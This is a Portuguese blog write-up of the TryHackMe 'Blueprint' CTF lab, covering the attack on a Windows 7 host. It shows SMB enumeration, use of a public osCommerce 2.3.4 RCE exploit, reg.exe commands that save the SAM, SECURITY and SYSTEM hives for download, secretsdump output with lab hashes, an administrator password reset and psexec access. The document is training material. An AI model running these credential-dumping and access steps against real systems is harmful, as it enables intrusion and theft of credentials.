---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Blueprint - Fácil
date: 2024-02-16 22:35:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, windows, web, facil, impacket, crackmapexec]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/blueprint.png){: w="100" h="100" .left}

---
# **CTF - Blueprint**
---
---
## **Enumeração**


### nmap

```shell
╭─      ~/thm/blueprint        INT ✘  33s 
╰─ sudo nmap  -Pn -sV -sS  --min-rate 5000 -stats-every 7s -p- 10.10.233.217 -oN nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-07 05:13 -03
Warning: 10.10.233.217 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.233.217                              
Host is up (0.22s latency).                                              
Not shown: 40141 filtered tcp ports (no-response), 25387 closed tcp ports (reset)      
PORT     STATE SERVICE      VERSION                                        
80/tcp   open  http         Microsoft IIS httpd 7.5            
135/tcp  open  msrpc        Microsoft Windows RPC                
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
8080/tcp open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.70 seconds
```
{: .nolineno }



Porta 8080 e 443  index of  

![alt text](/assets/img/blueprint1.png)

### crackmapexec, enum shares e users smb

```shell
╰─ crackmapexec smb 10.10.233.217 -u 'anonymous' -p '' --shares --users
SMB         10.10.233.217   445    BLUEPRINT        [*] Windows 7 Home Basic 7601 Service Pack 1 (name:BLUEPRINT) (domain:BLUEPRINT) (signing:False) (SMBv1:True)
SMB         10.10.233.217   445    BLUEPRINT        [+] BLUEPRINT\anonymous: 
SMB         10.10.233.217   445    BLUEPRINT        [+] Enumerated shares
SMB         10.10.233.217   445    BLUEPRINT        Share           Permissions     Remark
SMB         10.10.233.217   445    BLUEPRINT        -----           -----------     ------
SMB         10.10.233.217   445    BLUEPRINT        ADMIN$                          Remote Admin
SMB         10.10.233.217   445    BLUEPRINT        C$                              Default share
SMB         10.10.233.217   445    BLUEPRINT        IPC$                            Remote IPC
SMB         10.10.233.217   445    BLUEPRINT        Users           READ            
SMB         10.10.233.217   445    BLUEPRINT        Windows                         
SMB         10.10.233.217   445    BLUEPRINT        [-] Error enumerating domain users using dc ip 10.10.233.217: socket connection error while opening: [Errno 111] Connection refused
SMB         10.10.233.217   445    BLUEPRINT        [*] Trying with SAMRPC protocol
SMB         10.10.233.217   445    BLUEPRINT        [+] Enumerated domain user(s)
SMB         10.10.233.217   445    BLUEPRINT        BLUEPRINT\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.233.217   445    BLUEPRINT        BLUEPRINT\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.233.217   445    BLUEPRINT        BLUEPRINT\Lab     
```
{: .nolineno }

## **Acesso**

Acessando a pasta http://10.10.109.167:8080/oscommerce-2.3.4/catalog/
Contém um site de ecommerce, resolvi pesquisar `oscommerce-2.3.4 exploit`, optei por usar esse <https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution>

### Exploit

Ao executar o exploit recebi uma shell com usuário: `nt authority\system` (privilégio de admin)
Essa shell é bem limitada, ficamos presos nesse diretório.
Então fiz uma reverse powershell usei a powershell base64 daqui <https://n00br00t.github.io/sh/>

![alt text](/assets/img/blueprint2.png)

### Dump hashs

Dumpei as hashs com os comandos abaixo ja deixando na pasta do xampp pra baixar via browser.

`reg.exe save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\sam.save`  
`reg.exe save hklm\security C:\xampp\htdocs\oscommerce-2.3.4\security.save`  
`reg.exe save hklm\system C:\xampp\htdocs\oscommerce-2.3.4\system.save`  

Feito download dos arquivos pra minha máquina.

### impacket-secretsdump

Usando impacket pra pegar as hashs dos arquivos acima

```shell
╭─      ~/thm/blueprint         2 ✘ 
╰─ impacket-secretsdump  -sam sam.save -system system.save -security security.save LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4b360237b86b3290afd75586bf6b3ac6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
pentest:1002:aad3b435b51404eeaad3b435b51404ee:4b360237b86b3290afd75586bf6b3ac6:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):malware
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x9bd2f17b538da4076bf2ecff91dddfa93598c280
dpapi_userkey:0x251de677564f950bb643b8d7fdfafec784a730d1
[*] Cleaning up... 
```
{: .nolineno }

## Segundo método
### Dump hashs
A outra forma é alterar a senha do administrador e dumpar via crackmapexec smb

Alterei a senha com: `net user administrator senha123`

Com crackmap dumpei as hashs via smb usando credenciais de admin
![alt text](/assets/img/blueprint4.png)

### impacket-psexec

Conectando via impacket-psexec

```shell
╭─      ~/tools        
╰─ impacket-psexec ./administrator:'senha123'@'10.10.233.217'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.233.217.....
[*] Found writable share ADMIN$
[*] Uploading file fPMoAJBn.exe
[*] Opening SVCManager on 10.10.233.217.....
[*] Creating service fSnp on 10.10.233.217.....
[*] Starting service fSnp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32> 
```
{: .nolineno }
### Flag Administrator
![alt text](/assets/img/blueprint5.png)  

Usei o crackstation pra crackear a hash
![alt text](/assets/img/blueprint6.png)

**Conhecimento adquiridos:**
 - Dump de HASHS via reg.exe